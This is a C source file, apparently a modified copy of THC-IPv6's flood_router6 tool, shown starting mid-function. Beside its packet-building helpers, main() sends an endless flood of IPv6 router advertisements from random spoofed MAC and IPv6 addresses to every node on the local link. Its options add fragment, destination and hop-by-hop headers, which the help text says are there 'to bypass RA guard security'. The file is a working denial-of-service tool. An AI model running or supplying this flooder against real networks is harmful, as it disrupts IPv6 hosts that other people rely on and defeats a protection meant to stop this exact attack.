								local = 1;
						} else
							local = 1;
					}
				} else
					strcpy(defaultgw, router2);
				if (local == 1) {
					if (debug)
						printf("DEBUG: router found for %s: %s\n", tmpdst, router2);
					strcpy(tmpdst, router2);
				}
			}
		}
		if (local == 0 && strlen(defaultgw) > 0) {
			if (debug)
				printf("DEBUG: using default router for %s: %s\n", tmpdst, defaultgw);
			strcpy(tmpdst, defaultgw);
			local = 1;
		}
		if (local == 0) {
			if (_thc_ipv6_showerrors)
				fprintf(stderr, "Error: No idea where to route the packet to %s!\n", tmpdst);
			fclose(f);
			free(tmpdst);
			return NULL;
		}
		fclose(f);
	}

	p1 = thc_string2ipv6(tmpdst);
	if ((ret = thc_look_neighborcache(p1)) != NULL) {
		free(p1);
		free(tmpdst);
		return ret;
	}
	ret = thc_lookup_ipv6_mac(interface, p1);
	free(tmpdst);
	free(p1);
	return ret;
	*/
}

unsigned char *thc_get_own_mac(char *interface) {
	int s;
	struct ifreq ifr;
	char *mac;

	if (interface == NULL)
		interface = default_interface;

	if (_thc_ipv6_rawmode)
		return thc_ipv6_dummymac();

#if !defined (SIOCGIFHWADDR)
	struct ifaddrs *ifa, *ifx = NULL;
	struct sockaddr_dl *dl;

	getifaddrs(&ifa);
	ifx = ifa;
	mac = malloc(6);

	while (ifa != NULL) {
		dl = (struct sockaddr_dl *) ifa->ifa_addr;

		if (debug)
			thc_dump_data(dl->sdl_data, dl->sdl_nlen, "Interface loop");
		if (dl->sdl_nlen > 0 && strncmp(interface, dl->sdl_data, dl->sdl_nlen) == 0) {
			memcpy(mac, LLADDR(dl), 6);
			break;
		} else {
			ifa = ifa->ifa_next;
		}
	}

	if (ifa == NULL) {
		freeifaddrs(ifx);
		return NULL;                // error: could not find requested interface.  
	} else {
		freeifaddrs(ifx);
	}
#else /* SIOCGIFHWADDR */

	if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
		return NULL;
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", interface);
	if (ioctl(s, SIOCGIFHWADDR, (int8_t *) & ifr) < 0) {
		close(s);
		return NULL;
	}

	mac = malloc(6);
	memcpy(mac, &ifr.ifr_hwaddr.sa_data, 6);
	close(s);
#endif
	if (debug)
		thc_dump_data(mac, 6, "Own MAC address");
	return mac;
}

int thc_generate_pkt(char *interface, unsigned char *srcmac, unsigned char *dstmac, unsigned char *pkt, int *pkt_len) {
	thc_ipv6_hdr *hdr = (thc_ipv6_hdr *) pkt;
	thc_ipv6_ext_hdr *ehdr;
	thc_icmp6_hdr *ihdr;
	//thc_tcp_hdr *thdr;
	//thc_udp_hdr *uhdr;
	char *next, *mysrcmac = NULL, *mydstmac = NULL, *last_type, *checksum_src;
	int type, bufptr, do_checksum = 0, offset = 0, i, is_ip4 = 0;

	if (pkt == NULL || hdr->pkt != NULL || (hdr->pkt = malloc(*pkt_len + 14 + do_hdr_size + 64)) == NULL)
		return -1;

	hdr->pkt_len = *pkt_len;

	if (interface == NULL)
		interface = default_interface;

	if (thc_socket < 0)
		thc_socket = thc_open_ipv6();

	if (_thc_ipv6_rawmode == 0) {
		if (do_pppoe || do_6in4 || do_hdr_vlan) {
			if (do_pppoe) {
				memcpy(&hdr->pkt[0], do_hdr, do_hdr_size);
				hdr->pkt[18 + do_hdr_off] = (*pkt_len + 2) / 256;
				hdr->pkt[19 + do_hdr_off] = (*pkt_len + 2) % 256;
			} else if (do_6in4) { // 6in4
				do_hdr[16 + do_hdr_off] = (*pkt_len + 20) / 256;
				do_hdr[17 + do_hdr_off] = (*pkt_len + 20) % 256;
				// hdrchecksum
				i = calculate_checksum(do_hdr + 14 + do_hdr_off, 20);
				memcpy(&hdr->pkt[0], do_hdr, do_hdr_size);
				hdr->pkt[24 + do_hdr_off] =  i / 256;
				hdr->pkt[25 + do_hdr_off] =  i % 256;
			} else {
				memcpy(&hdr->pkt[0], do_hdr, do_hdr_size);
			}
			offset += do_hdr_size;
			hdr->pkt_len += offset;
			*pkt_len += offset;
		} else {
			offset += 14;
			hdr->pkt_len += offset;
			*pkt_len += offset;

			if (srcmac == NULL) {
				mysrcmac = thc_get_own_mac(interface);
				//mysrcmac = NULL;
				//fprintf(stderr, "Error: no src MAC address provided (it's NULL), this version is unable to get the MAC address of an interface\n");
			}
			else
				mysrcmac = srcmac;

			if (dstmac == NULL) {
				//mydstmac = thc_get_mac(interface, hdr->src, hdr->dst);
				mydstmac = NULL;
				fprintf(stderr, "Error: no dst MAC address provided (it's NULL), this version is unable to get the MAC address of an interface\n");
			}
			else
				mydstmac = dstmac;

			if (mysrcmac == NULL || mydstmac == NULL) {
				if (_thc_ipv6_showerrors)
					fprintf(stderr, "Error: could not get target MAC address\n");
				if (mysrcmac != NULL && srcmac == NULL)
					free(mysrcmac);
				if (mydstmac != NULL && dstmac == NULL)
					free(mydstmac);
				return -1;
			}

			memset(hdr->pkt, 0, *pkt_len);
			memcpy(&hdr->pkt[0], mydstmac, 6);
			memcpy(&hdr->pkt[6], mysrcmac, 6);
			hdr->pkt[12] = IPV6_FRAME_TYPE / 256;
			hdr->pkt[13] = IPV6_FRAME_TYPE % 256;
		}
	}

	hdr->pkt[0 + offset] = ((hdr->version % 16) << 4) | (hdr->class / 16);
	hdr->pkt[1 + offset] = ((hdr->class % 16) << 4) | ((hdr->label % 1048576) / 65536);
	hdr->pkt[2 + offset] = (hdr->label % 65536) / 256;
	hdr->pkt[3 + offset] = hdr->label % 256;
	hdr->pkt[4 + offset] = hdr->length / 256;
	hdr->pkt[5 + offset] = hdr->length % 256;
	if (hdr->next != NXT_IP4_RUDIMENTARY)
		hdr->pkt[6 + offset] = hdr->next;
	else
		hdr->pkt[6 + offset] = NXT_IP4;
	last_type = &hdr->pkt[7 + offset];
	hdr->pkt[7 + offset] = hdr->ttl;
	memcpy(&hdr->pkt[8 + offset], hdr->src, 16);
	memcpy(&hdr->pkt[24 + offset], hdr->dst, 16);

	next = hdr->next_segment;
	type = hdr->next;
	bufptr = 40 + offset;
	checksum_src = hdr->original_src;

	// here go extension headers (not icmp6, tcp, udp, pim, etc.)
	// BUT ipv4 yes, but not IP4_RUDIMENTARY
	while (type == NXT_HDR || type == NXT_ROUTE || type == NXT_FRAG || type == NXT_OPTS || type == NXT_INVALID || type == NXT_IGNORE || type == NXT_AH || type == NXT_ESP || type == NXT_IP4 || type == NXT_IP6) {
		if (type != NXT_IP4 && type != NXT_IP6) {
			ehdr = (thc_ipv6_ext_hdr *) next;
			if (ehdr->next != NXT_IP4_RUDIMENTARY)
				hdr->pkt[bufptr] = ehdr->next;
			else
				hdr->pkt[bufptr] = NXT_IP4;
			hdr->pkt[bufptr + 1] = ehdr->length;
			last_type = &hdr->pkt[bufptr];
			if (ehdr->data != NULL && ehdr->data_len > 0) {
				memcpy(&hdr->pkt[bufptr + 2], ehdr->data, ehdr->data_len);
				if (type == NXT_OPTS && hdr->pkt[bufptr + 2] == 0xc9) {   // mobile home address option
					checksum_src = &hdr->pkt[bufptr + 4];
				}
			}
			bufptr += 2 + ehdr->data_len;
			next = ehdr->next_segment;
			type = ehdr->next;
		} else {
			if (type == NXT_IP4) {
				is_ip4 = bufptr;
				printf("NXT_IP4 NOT IMPLEMENTED\n"); // to be filled XXX TODO FIXME

			} else if (type == NXT_IP6) {
				printf("NXT_IP6 NOT IMPLEMENTED"); // to be filled XXX TODO FIXME

			}
		}
	}

	// now the rest of protocols that are final destinations
	switch (type) {
	case NXT_NONXT:
		break;
	case NXT_PIM:
		ehdr = (thc_ipv6_ext_hdr *) next;
		memcpy(&hdr->pkt[bufptr], ehdr->data, ehdr->data_len);
		hdr->pkt[bufptr + 2] = 0;
		hdr->pkt[bufptr + 3] = 0;
		do_checksum = checksum_pseudo_header(checksum_src, hdr->final_dst, NXT_PIM, &hdr->pkt[bufptr], ehdr->data_len);
		hdr->pkt[bufptr + 2] = do_checksum / 256;
		hdr->pkt[bufptr + 3] = do_checksum % 256;
		bufptr += ehdr->data_len;
		break;
	
	case NXT_ICMP6:
		ihdr = (thc_icmp6_hdr *) next;
		if (ihdr->checksum == DO_CHECKSUM) {
			ihdr->checksum = 0;
			do_checksum = 1;
		}
		hdr->pkt[bufptr] = ihdr->type;
		hdr->pkt[bufptr + 1] = ihdr->code;
		hdr->pkt[bufptr + 2] = ihdr->checksum / 256;
		hdr->pkt[bufptr + 3] = ihdr->checksum % 256;
		hdr->pkt[bufptr + 4] = ihdr->flags / 16777216;
		hdr->pkt[bufptr + 5] = (ihdr->flags % 16777216) / 65536;
		hdr->pkt[bufptr + 6] = (ihdr->flags % 65536) / 256;
		hdr->pkt[bufptr + 7] = ihdr->flags % 256;
		if (ihdr->data != NULL && ihdr->data_len > 0)
			memcpy(&hdr->pkt[bufptr + 8], ihdr->data, ihdr->data_len);
		if (do_checksum) {
			//memcpy( hdr->final_dst, hdr->pkt + 38, 16);
			ihdr->checksum = checksum_pseudo_header(checksum_src, hdr->final_dst, NXT_ICMP6, &hdr->pkt[bufptr], 8 + ihdr->data_len);
			/*
			printf("\n");
			thc_dump_data((unsigned char *)hdr->pkt + 22, 16,"packet     source");
			thc_dump_data((unsigned char *)checksum_src, 16, "original   source");
			thc_dump_data((unsigned char *)hdr->final_dst, 16,    "final destination");
			thc_dump_data((unsigned char *)hdr->pkt + 38, 16,    "pkt   destination");
			printf("\n");
			*/
			hdr->pkt[bufptr + 2] = ihdr->checksum / 256;
			hdr->pkt[bufptr + 3] = ihdr->checksum % 256;
			do_checksum = 0;
		}
		bufptr += 8 + ihdr->data_len;
		break;
	/*
	case NXT_TCP:
		thdr = (thc_tcp_hdr *) next;
		if (thdr->checksum == DO_CHECKSUM) {
			thdr->checksum = 0;
			do_checksum = 1;
		}
		hdr->pkt[bufptr] = thdr->sport / 256;
		hdr->pkt[bufptr + 1] = thdr->sport % 256;
		hdr->pkt[bufptr + 2] = thdr->dport / 256;
		hdr->pkt[bufptr + 3] = thdr->dport % 256;
		hdr->pkt[bufptr + 4] = thdr->sequence / 16777216;
		hdr->pkt[bufptr + 5] = (thdr->sequence % 16777216) / 65536;
		hdr->pkt[bufptr + 6] = (thdr->sequence % 65536) / 256;
		hdr->pkt[bufptr + 7] = thdr->sequence % 256;
		hdr->pkt[bufptr + 8] = thdr->ack / 16777216;
		hdr->pkt[bufptr + 9] = (thdr->ack % 16777216) / 65536;
		hdr->pkt[bufptr + 10] = (thdr->ack % 65536) / 256;
		hdr->pkt[bufptr + 11] = thdr->ack % 256;
		hdr->pkt[bufptr + 12] = thdr->length;
		hdr->pkt[bufptr + 13] = thdr->flags;
		hdr->pkt[bufptr + 14] = thdr->window % 256;
		hdr->pkt[bufptr + 15] = thdr->window / 256;
		hdr->pkt[bufptr + 18] = thdr->urgent % 256;
		hdr->pkt[bufptr + 19] = thdr->urgent / 256;

		if (thdr->option != NULL && thdr->option_len > 0)
			memcpy(&hdr->pkt[bufptr + 20], thdr->option, thdr->option_len);
		if (thdr->data != NULL && thdr->data_len > 0)
			memcpy(&hdr->pkt[bufptr + 20 + thdr->option_len], thdr->data, thdr->data_len);
		if (do_checksum) {
			//memcpy( hdr->final_dst, hdr->pkt + 38, 16);
			thdr->checksum = checksum_pseudo_header(checksum_src, hdr->final_dst, NXT_TCP, &hdr->pkt[bufptr], 20 + thdr->option_len + thdr->data_len);

			
			//printf("\n");
			//thc_dump_data((unsigned char *)hdr->pkt + 22, 16,"packet     source");
			//thc_dump_data((unsigned char *)checksum_src, 16, "original   source");
			//thc_dump_data((unsigned char *)hdr->final_dst, 16,    "final destination");
			//thc_dump_data((unsigned char *)hdr->pkt + 38, 16,    "pkt   destination");
			//printf("\n");
			
			hdr->pkt[bufptr + 16] = thdr->checksum / 256;
			hdr->pkt[bufptr + 17] = thdr->checksum % 256;
			do_checksum = 0;
		}
		bufptr += 20 + thdr->option_len + thdr->data_len;

		break;
	case NXT_IP4_RUDIMENTARY:
		memcpy(hdr->pkt + bufptr, next, THC_IPv4_RUDIMENTARY_LEN);
		bufptr += THC_IPv4_RUDIMENTARY_LEN;
		break;
	case NXT_UDP:
		uhdr = (thc_udp_hdr *) next;
		if (uhdr->checksum == DO_CHECKSUM) {
			uhdr->checksum = 0;
			do_checksum = 1;
		}
		hdr->pkt[bufptr] = uhdr->sport / 256;
		hdr->pkt[bufptr + 1] = uhdr->sport % 256;
		hdr->pkt[bufptr + 2] = uhdr->dport / 256;
		hdr->pkt[bufptr + 3] = uhdr->dport % 256;
		hdr->pkt[bufptr + 4] = uhdr->length / 256;
		hdr->pkt[bufptr + 5] = uhdr->length % 256;

		if (uhdr->data != NULL && uhdr->data_len > 0)
			memcpy(&hdr->pkt[bufptr + 8], uhdr->data, uhdr->data_len);
		if (do_checksum) {
			//memcpy( hdr->final_dst, hdr->pkt + 38, 16);
			uhdr->checksum = checksum_pseudo_header(checksum_src, hdr->final_dst, NXT_UDP, &hdr->pkt[bufptr], 8 + uhdr->data_len);

			
			//printf("\n");
			//thc_dump_data((unsigned char *)hdr->pkt + 22, 16,"packet     source");
			//thc_dump_data((unsigned char *)checksum_src, 16, "original   source");
			//thc_dump_data((unsigned char *)hdr->final_dst, 16,    "final destination");
			//thc_dump_data((unsigned char *)hdr->pkt + 38, 16,    "pkt   destination");
			//printf("\n");
			
			hdr->pkt[bufptr + 6] = uhdr->checksum / 256;
			hdr->pkt[bufptr + 7] = uhdr->checksum % 256;
			do_checksum = 0;
		}
		bufptr += 8 + uhdr->data_len;

		break;
	case NXT_DATA:
		ehdr = (thc_ipv6_ext_hdr *) next;
		memcpy(&hdr->pkt[bufptr], ehdr->data, ehdr->data_len);
		if (ehdr->next == NXT_MIPV6) {
			do_checksum = checksum_pseudo_header(checksum_src, hdr->final_dst, NXT_MIPV6, &hdr->pkt[bufptr], ehdr->data_len);
			hdr->pkt[bufptr + 4] = do_checksum / 256;
			hdr->pkt[bufptr + 5] = do_checksum % 256;
		}
		bufptr += ehdr->data_len;
		*last_type = ehdr->next;
		break;
	*/
		// XXX TODO FIXME: other protocols

	default:
		if (_thc_ipv6_showerrors)
			fprintf(stderr, "Error: Data packet type %d not implemented!\n", type);
		if (srcmac == NULL)
			free(mysrcmac);
		if (dstmac == NULL)
			free(mydstmac);
		return -1;
	}

	if (bufptr != *pkt_len)
		if (_thc_ipv6_showerrors)
			fprintf(stderr, "Warning: packet size mismatch (%d != %d)!\n", *pkt_len, bufptr);

	if (debug)
		thc_dump_data(hdr->pkt, *pkt_len, "Generated Packet");
	if (srcmac == NULL && mysrcmac != NULL)
		free(mysrcmac);
	if (dstmac == NULL && mydstmac != NULL)
		free(mydstmac);
	if (debug)
		printf("Returning from thc_generate_pkt()\n");

	return 0;
}

int thc_send_pkt(char *interface, unsigned char *pkt, int *pkt_len) {
	struct sockaddr sa;
	thc_ipv6_hdr *hdr = (thc_ipv6_hdr *) pkt;

	if (pkt == NULL || hdr->pkt == NULL || hdr->pkt_len < 1 || hdr->pkt_len > 65535)
		return -2;

	if (interface == NULL)
		interface = default_interface;
	strcpy(sa.sa_data, interface);

	if (thc_socket < 0)
		thc_socket = thc_open_ipv6();
	if (thc_socket < 0 && geteuid() != 0) {
		fprintf(stderr, "Error: Program must be run as root.\n");
		exit(-1);
	}

	//if (debug)
	//	thc_dump_data(hdr->pkt, hdr->pkt_len, "Sent Packet");

	if ((_thc_ipv6_rawmode > 0 && hdr->pkt_len > thc_get_mtu(interface)) || (_thc_ipv6_rawmode == 0 && hdr->pkt_len > thc_get_mtu(interface) + 14)) {
		if (_thc_ipv6_showerrors)
			fprintf(stderr, "Warning: packet size is larger than MTU of interface (%d > %d)!\n", hdr->pkt_len, thc_get_mtu(interface));
		if (thc_get_mtu(interface) == -1) {
			if (_thc_ipv6_showerrors)
				fprintf(stderr, "Error: interface invalid\n");
			exit( -1);
		} 
	}

	return sendto(thc_socket, hdr->pkt, hdr->pkt_len, 0, &sa, sizeof(sa));
}

int thc_generate_and_send_pkt(char *interface, unsigned char *srcmac, unsigned char *dstmac, unsigned char *pkt, int *pkt_len) {
	if (thc_generate_pkt(interface, srcmac, dstmac, pkt, pkt_len))
		return -1;
	while (thc_send_pkt(interface, pkt, pkt_len) == -1)
		usleep(1);
	return 0;
}

unsigned char *thc_destroy_packet(unsigned char *pkt) {
	char *ptrs[16375];
	int iptr = 0;
	char *next;
	int type;
	thc_ipv6_hdr *hdr = (thc_ipv6_hdr *) pkt;
	thc_ipv6_ext_hdr *ehdr;
	thc_icmp6_hdr *ihdr;
	//thc_tcp_hdr *thdr;
	//thc_udp_hdr *uhdr;

	ptrs[iptr] = pkt;
	iptr++;
	next = hdr->next_segment;
	type = hdr->next;

	if (hdr->pkt != NULL)
		free(hdr->pkt);

	while (type == NXT_HDR || type == NXT_ROUTE || type == NXT_FRAG || type == NXT_OPTS || type == NXT_INVALID || type == NXT_IGNORE || type == NXT_AH || type == NXT_ESP) {
		ehdr = (thc_ipv6_ext_hdr *) next;
		ptrs[iptr] = ehdr->data;
		iptr++;
		ptrs[iptr] = (char *) ehdr;
		iptr++;
		next = ehdr->next_segment;
		type = ehdr->next;
	}

	switch (type) {
	case NXT_NONXT:
		break;
	case NXT_ICMP6:
		ihdr = (thc_icmp6_hdr *) next;
		ptrs[iptr] = ihdr->data;
		iptr++;
		ptrs[iptr] = (char *) ihdr;
		iptr++;
		break;
	/*
	case NXT_TCP:
		thdr = (thc_tcp_hdr *) next;
		ptrs[iptr] = thdr->option;
		iptr++;
		ptrs[iptr] = thdr->data;
		iptr++;
		ptrs[iptr] = (char *) thdr;
		iptr++;
		break;
	case NXT_UDP:
		uhdr = (thc_udp_hdr *) next;
		ptrs[iptr] = uhdr->data;
		iptr++;
		ptrs[iptr] = (char *) uhdr;
		iptr++;
		break;
	case NXT_IP4_RUDIMENTARY:
		free(next);
		break;
	case NXT_DATA:
		ehdr = (thc_ipv6_ext_hdr *) next;
		ptrs[iptr] = ehdr->data;
		iptr++;
		ptrs[iptr] = (char *) ehdr;
		iptr++;
		break;
	case NXT_PIM:
		ehdr = (thc_ipv6_ext_hdr *) next;
		ptrs[iptr] = ehdr->data;
		iptr++;
		ptrs[iptr] = (char *) ehdr;
		iptr++;
		break;
	*/
		// XXX TODO: other protocols

	default:
		if (_thc_ipv6_showerrors)
			fprintf(stderr, "Error: Data packet type %d not implemented - some data not free'ed!\n", type);
	}
	ptrs[iptr] = NULL;

	while (iptr >= 0) {
		if (debug)
			printf("free ptrs[%d]=%p\n", iptr, ptrs[iptr]);
		if (ptrs[iptr] != NULL)
			free(ptrs[iptr]);
		iptr--;
	}

	return NULL;
}

int thc_send_as_fragment6(char *interface, unsigned char *src, unsigned char *dst, unsigned char type, unsigned char *data, int data_len, int frag_len) {
	unsigned char *pkt = NULL, *srcmac, *dstmac;
	int pkt_len, mymtu = thc_get_mtu(interface);
	unsigned char buf[frag_len];
	int count, id = time(NULL) % 2000000000, dptr = 0, last_size, run = 0;

	if (frag_len > mymtu - 48)
		frag_len = mymtu - 48;
	if (frag_len % 8 > 0)
		frag_len = (frag_len / 8) * 8;
	if (frag_len < 8)
		frag_len = 8;

	if ((srcmac = thc_get_own_mac(interface)) == NULL)
		return -1;
	if ((dstmac = thc_get_mac(interface, src, dst)) == NULL) {
		free(srcmac);
		return -1;
	}

	count = data_len / frag_len;
	if (data_len % frag_len > 0) {
		count++;
		last_size = data_len % frag_len;
	} else
		last_size = frag_len;

	if (debug)
		printf("DEBUG: data to fragment has size of %d bytes, sending %d packets with size %d, last packet has %d bytes\n", data_len, count, frag_len, last_size);

	while (count) {
		if ((pkt = thc_create_ipv6_extended(interface, PREFER_GLOBAL, &pkt_len, src, dst, 0, 0, 0, 0, 0)) == NULL) {
			free(srcmac);
			free(dstmac);
			return -1;
		}
		if (thc_add_hdr_fragment(pkt, &pkt_len, dptr / 8, count == 1 ? 0 : 1, id)) {
			free(srcmac);
			free(dstmac);
			return -1;
		}
		if (count > 1)
			memcpy(buf, data + run * frag_len, frag_len);
		else
			memcpy(buf, data + run * frag_len, last_size);
		dptr += frag_len;
		run++;
		if (thc_add_data6(pkt, &pkt_len, type, buf, count == 1 ? last_size : frag_len)) {
			free(srcmac);
			free(dstmac);
			return -1;
		}
		thc_generate_and_send_pkt(interface, srcmac, dstmac, pkt, &pkt_len);
		pkt = thc_destroy_packet(pkt);
		count--;
	}
	free(srcmac);
	free(dstmac);
	return 0;
}






void help(char *prg) {
	printf("%s %s - Modified by %s - (c) 2014 by %s %s\n\n", prg, VERSION, AUTHOR, ORIGINAL_AUTHOR, RESOURCE);
	printf("Syntax: %s [-HFD] interface\n\n", prg);
	printf("Flood the local network with router advertisements.\n");
	printf("-F/-D/-H add fragment/destination/hopbyhop header to bypass RA guard security.\n");

	//  printf("Use -r to use raw mode.\n\n");
	exit(-1);
}

int main(int argc, char *argv[]) {
	char *interface, mac[6] = "";
	unsigned char *routerip6, *route6, *mac6 = mac, *ip6;
	unsigned char buf[56], buf2[6], buf3[1504];
	unsigned char dst[] = { 0xff, 0x02, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x01 }; // "ff02::1"
	unsigned char *dstmac = thc_get_multicast_mac(dst);
	int size, mtu, i, type = NXT_ICMP6;
	unsigned char *pkt = NULL;
	int pkt_len = 0, rawmode = 0, count = 0, do_hop = 0, do_frag = 0, cnt, do_dst = 0, offset = 14;
	thc_ipv6_hdr *hdr = NULL;


	if (argc < 2 || strncmp(argv[1], "-h", 2) == 0)
		help(argv[0]);

	//printf("!\n! Please note: flood_router6 is deprecated, please use flood_router26!\n!\n\n");

	while ((i = getopt(argc, argv, "DFHr")) >= 0) {
		switch (i) {
		case 'r':
			thc_ipv6_rawmode(1);
			rawmode = 1;
			break;
		case 'F':
			do_frag++;
			break;
		case 'H':
			do_hop = 1;
			break;
		case 'D':
			do_dst = 1;
			break;
		default:
			fprintf(stderr, "Error: invalid option %c\n", i);
			exit(-1);
		}
	}

	if (argc - optind < 1)
		help(argv[0]);

	srand(time(NULL) + getpid());
	setvbuf(stdout, NULL, _IONBF, 0);

	interface = argv[optind];
	mtu = 1500;
	size = 64;
	ip6 = malloc(16);
	routerip6 = malloc(16);
	route6 = malloc(16);
	if (do_hdr_size)
		offset = do_hdr_size;

	mac[0] = 0x00;
	mac[1] = 0x18;
	memset(ip6, 0, 16);
	ip6[0] = 0xfe;
	ip6[1] = 0x80;
	ip6[8] = 0x02;
	ip6[9] = mac[1];
	ip6[11] = 0xff;
	ip6[12] = 0xfe;
	routerip6[0] = 0x2a;
	routerip6[1] = 0x01;
	routerip6[15] = 0x01;
	memset(route6 + 8, 0, 8);

	memset(buf2, 0, sizeof(buf2));
	memset(buf3, 0, sizeof(buf3));

	memset(buf, 0, sizeof(buf));
	buf[1] = 250;
	buf[5] = 30;
	buf[8] = 5;
	buf[9] = 1;
	buf[12] = mtu / 16777216;
	buf[13] = (mtu % 16777216) / 65536;
	buf[14] = (mtu % 65536) / 256;
	buf[15] = mtu % 256;
	buf[16] = 3;
	buf[17] = 4;
	buf[18] = size;
	buf[19] = 128 + 64 + 32;
	memset(&buf[20], 255, 8);
	buf[48] = 1;
	buf[49] = 1;

	printf("Starting to flood network with router advertisements on %s (Press Control-C to end, a dot is printed for every 1000 packets):\n", interface);
	while (1) {

		for (i = 2; i < 6; i++)
			mac[i] = rand() % 256;
		for (i = 2; i < 8; i++)
			routerip6[i] = rand() % 256;

		//    ip6[9] = mac[1];
		ip6[10] = mac[2];
		ip6[13] = mac[3];
		ip6[14] = mac[4];
		ip6[15] = mac[5];
		memcpy(route6, routerip6, 8);
		memcpy(&buf[32], route6, 16);
		memcpy(&buf[50], mac6, 6);

		count++;

		if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, ip6, dst, 255, 0, 0, 0, 0)) == NULL)
			return -1;
		if (do_hop) {
			type = NXT_HBH;
			if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf2, sizeof(buf2)) < 0)
				return -1;
		}
		if (do_frag) {
			if (type == NXT_ICMP6)
				type = NXT_FRAG;
			for (i = 0; i < do_frag; i++)
				if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, cnt++) < 0)
					return -1;
		}
		if (do_dst) {
			if (type == NXT_ICMP6)
				type = NXT_DST;
			if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0)
				return -1;
		}
		if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, 0xff08ffff, buf, sizeof(buf), 0) < 0)
			return -1;
		if (do_dst) {
			thc_generate_pkt(interface, mac6, dstmac, pkt, &pkt_len);
			hdr = (thc_ipv6_hdr *)pkt;
			thc_send_as_fragment6(interface, ip6, dst, type, hdr->pkt + 40 + offset, hdr->pkt_len - 40 - offset, 1240);
		}
		else {
			if (thc_generate_and_send_pkt(interface, mac6, dstmac, pkt, &pkt_len) < 0) {
				printf("!");
				//        fprintf(stderr, "Error sending packet no. %d on interface %s: ", count, interface);
				//        perror("");
				//        return -1;
			}
		}

		pkt = thc_destroy_packet(pkt);
		//    usleep(1);
		if (count % 1000 == 0)
			printf(".");
	}
	return 0;
}
